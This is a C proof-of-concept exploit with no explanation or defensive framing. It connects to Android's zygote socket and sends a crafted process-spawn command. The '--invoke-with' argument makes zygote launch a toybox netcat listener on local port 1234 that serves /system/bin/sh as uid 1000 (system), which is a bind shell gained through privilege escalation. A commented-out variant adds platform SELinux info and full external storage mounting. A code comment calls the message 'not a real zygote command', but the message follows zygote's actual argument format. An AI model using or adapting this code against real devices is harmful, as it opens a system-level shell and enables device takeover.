#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>

#define SOCKET_PATH "/dev/socket/zygote"

int main(void) {
    int sockfd;
    struct sockaddr_un addr;

    // Create Unix domain stream socket
    sockfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(struct sockaddr_un));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);

    // Connect to zygote socket
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    getchar();

    // Example message (not a real zygote command)
    // const char *msg = "14\n"
    //   "--runtime-args\n"
    //   "--setuid=1000\n"
    //   "--setgid=1000\n"
    //   "--runtime-flags=2049\n"
    //   "--mount-external-full\n"
    //   "--target-sdk-version=29\n"
    //   "--setgroups=3003\n"
    //   "--nice-name=runnetcat\n"
    //   "--seinfo=platform:su:targetSdkVersion=29:complete\n"
    //   "--invoke-with toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l;\n"
    //   "--instruction-set=arm\n"
    //   "--app-data-dir=/data/\n"
    //   "--package-name=com.android.settings\n"
    //   "com.android.app.ActivityThread\n";
    const char *msg = "8\n"
      "--runtime-args\n"
      "--setuid=1000\n"
      "--setgid=1000\n"
      "--target-sdk-version=29\n"
      "--nice-name=runnetcat\n"
      "--invoke-with toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l;\n"
      "--package-name=com.android.calculator2\n"
      "com.android.app.ActivityThread\n";
    if (write(sockfd, msg, strlen(msg)) < 0) {
        perror("write");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Message sent: %s\n", msg);

    for (;;) {
        sleep(10);
    }

    // Optionally read a response
    char buffer[256];
    ssize_t n = read(sockfd, buffer, sizeof(buffer) - 1);
    if (n > 0) {
        buffer[n] = '\0';
        printf("Received: %s\n", buffer);
    } else if (n == 0) {
        printf("Server closed connection.\n");
    } else {
        perror("read");
    }

    close(sockfd);
    return 0;
}
